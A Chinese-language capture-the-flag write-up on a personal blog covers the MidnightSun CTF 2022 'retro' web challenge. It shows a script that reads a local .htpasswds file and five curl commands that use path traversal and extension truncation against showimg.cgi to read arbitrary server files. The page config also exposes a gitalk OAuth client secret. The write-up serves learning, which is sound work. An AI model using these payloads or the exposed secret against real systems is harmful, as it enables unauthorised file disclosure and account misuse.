@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="MidSunCTF啥都没做出来  感觉这学期水平没啥长进  主要是精力有点分散了  不过路还很长 加油~ retro Check out my homepage in cyber space  尝试一下读文件 (后来想了下 这个想法可能是愚蠢的  或许这种方法只适合在特定的场合中使用)  1&lt;iframe src&#x3D;&quot;.&#x2F;&quot; height&#x3D;&quot;1600px&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MidnightCTF2022">
+<meta property="og:url" content="http://example.com/2022/04/11/MidnightCTF2022/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="MidSunCTF啥都没做出来  感觉这学期水平没啥长进  主要是精力有点分散了  不过路还很长 加油~ retro Check out my homepage in cyber space  尝试一下读文件 (后来想了下 这个想法可能是愚蠢的  或许这种方法只适合在特定的场合中使用)  1&lt;iframe src&#x3D;&quot;.&#x2F;&quot; height&#x3D;&quot;1600px&amp;quot">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/MyBlog/b1ue0cean.github.io/source_posts/MidnightCTF2022.assets/image-20220402184941839.png">
+<meta property="article:published_time" content="2022-04-11T04:13:15.000Z">
+<meta property="article:modified_time" content="2022-04-11T04:15:08.080Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/MyBlog/b1ue0cean.github.io/source_posts/MidnightCTF2022.assets/image-20220402184941839.png">
+
+
+<link rel="canonical" href="http://example.com/2022/04/11/MidnightCTF2022/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/04/11/MidnightCTF2022/","path":"2022/04/11/MidnightCTF2022/","title":"MidnightCTF2022"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>MidnightCTF2022 | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">8</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">6</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">15</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MidSunCTF"><span class="nav-number">1.</span> <span class="nav-text">MidSunCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#retro"><span class="nav-number">1.1.</span> <span class="nav-text">retro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E5%88%AB%E4%BA%BA%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="nav-number">1.1.1.</span> <span class="nav-text">学习别人的解法</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/11/MidnightCTF2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="MidnightCTF2022 | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MidnightCTF2022
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-11 12:13:15 / Modified: 12:15:08" itemprop="dateCreated datePublished" datetime="2022-04-11T12:13:15+08:00">2022-04-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="MidSunCTF"><a href="#MidSunCTF" class="headerlink" title="MidSunCTF"></a>MidSunCTF</h1><p>啥都没做出来  感觉这学期水平没啥长进  主要是精力有点分散了  不过路还很长 加油~</p>
+<h2 id="retro"><a href="#retro" class="headerlink" title="retro"></a>retro</h2><blockquote>
+<p>Check out my homepage in cyber space</p>
+</blockquote>
+<p>尝试一下读文件 (后来想了下 这个想法可能是愚蠢的  或许这种方法只适合在特定的场合中使用)</p>
+<p><img src="D:\MyBlog\b1ue0cean.github.io\source_posts\MidnightCTF2022.assets\image-20220402184941839.png" alt="image-20220402184941839"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;./&quot;</span> <span class="attribute">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Apache</span>/<span class="number">2</span>.<span class="number">4</span>.<span class="number">53</span> (Unix)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params">&#123;<span class="variable language_">document</span>.write(<span class="variable language_">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///.htpasswds&quot;</span>);x.send();</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="学习别人的解法"><a href="#学习别人的解法" class="headerlink" title="学习别人的解法"></a>学习别人的解法</h3><p>引用：<a target="_blank" rel="noopener" href="https://scavengersecurity.com/posts/midnightsunctf-retro/">https://scavengersecurity.com/posts/midnightsunctf-retro/</a></p>
+<p>在 <code>/cgi-bin/showimg.cgi?./1.gif</code>  这个接口似乎有问题</p>
+<p>但是 只能以 <code>.gif</code> 结尾   所以 我们要想办法来绕过？</p>
+<p>怎么绕过？</p>
+<p>看了两篇writeup 他们似乎风轻云淡的说 可以通过长度限制来绕过</p>
+<p>但究竟是为什么？ </p>
+<p>这可能要从这题的环境说起</p>
+<p>The environment is set up as follows:</p>
+<ul>
+<li>We don’t have ability to upload files</li>
+<li>It doesn’t have a database  (具体怎么看出来的我不太清楚)</li>
+<li>The data isn’t saved anywhere server-side and there are no cookies.</li>
+</ul>
+<p>如果按这个思路想下去 可以判断出(引用大佬分析)</p>
+<p>The points we came across with the testing is the following one:</p>
+<ul>
+<li>The user request is stored in a large buffer</li>
+<li>The extension comparison is successfully checked with this buffer</li>
+<li>The request is formatted into a smaller buffer so the exceeded characters are not included.</li>
+<li>If we exploit the buffer size differences, with correct length, final path may be clean of the mandatory <code>.gif</code> extension so we’re able to get any file in the server independent to the extension.</li>
+</ul>
+<p>so 可以构造一个截断的payload 来实现任意文件读取 （ 很难想到</p>
+<p>最终下载方式如下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/color.cgi/</span>.gif -o color.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>apache2<span class="regexp">/cgi-bin/m</span>adlib.cgi/.gif -o madlib.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/lorem.cgi/</span>.gif -o lorem.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>apache2<span class="regexp">/cgi-bin/</span>joke.cgi/.gif -o joke.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/counter.cgi/</span>.gif -o counter.cgi</span><br></pre></td></tr></table></figure>
+
+<p>之后对CGI文件进行分析（由于偷懒 没环境复现了 学习一下 LFI</p>
+<p>留一个思考的问题 ： 如何判断一个端点容易受到文件包含的攻击</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/04/11/MidnightCTF2022/" title="MidnightCTF2022">http://example.com/2022/04/11/MidnightCTF2022/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/04/11/learn31/" rel="prev" title="learn31">
+                  <i class="fa fa-chevron-left"></i> learn31
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"8a50ab82f4e5bc0faccd9958b5f091f0"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
